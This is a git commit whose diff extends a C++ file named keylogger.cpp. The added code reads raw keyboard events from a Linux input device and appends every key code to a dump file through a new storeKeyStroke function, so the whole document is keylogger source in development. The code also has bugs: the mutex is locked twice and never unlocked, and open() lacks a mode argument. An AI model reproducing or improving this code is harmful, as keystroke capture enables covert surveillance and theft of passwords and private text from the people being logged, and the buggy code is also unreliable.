0c19ec89169137c36fdcfcae1b50927af332e7d2
Marco Antonio Garrido Rojo <3d17marcoantonio.garrido@gmail.com>
2017-01-03 20:12:00 +0100

    Include storeKeyStroke function

--- keylogger.cpp
+++ keylogger.cpp
@@ -5,12 +5,32 @@
 #include <string.h>
 #include <linux/input.h>
 #include <fcntl.h>
+#include <pthread.h>
 
-#define KEYBOARDFILE "/dev/input/event0"
+#define KEYBOARDFILE "/dev/input/event2"
+#define FILE "test.dump"
+
+pthread_mutex_t mut;
+pthread_t th;
+
+char * FILE_NAME = FILE;
+
+int storeKeyStroke(char * c, int len) {
+    int ret = -1, file = 0;
+    pthread_mutex_lock(&mut);
+    if ((file = open(FILE_NAME, O_WRONLY | O_APPEND | O_CREAT)) == -1)
+        perror("File error");
+    else if ((ret = write(file, c, len)) < 0)
+        perror("Write error"), ret = -1;
+    close(file);
+    pthread_mutex_lock(&mut);
+    return ret;
+}
 
 int main() {
     int fd;
     struct input_event ie;
+    pthread_mutex_init(&mut,NULL);
 
     if((fd = open(KEYBOARDFILE, O_RDONLY)) == -1) {
         perror("Device error");
@@ -20,6 +40,12 @@ int main() {
     while(read(fd, &ie, sizeof(struct input_event))) {
         printf("time %ld.%06ld\ttype %d\tcode %d\tvalue %d\n",
                ie.time.tv_sec, ie.time.tv_usec, ie.type, ie.code, ie.value);
+        char c = ie.code;
+        if (storeKeyStroke(&c, 1) < 0) {
+            close(fd);
+            exit(EXIT_FAILURE);
+        }
     }
+    close(fd);
     return 0;
 }
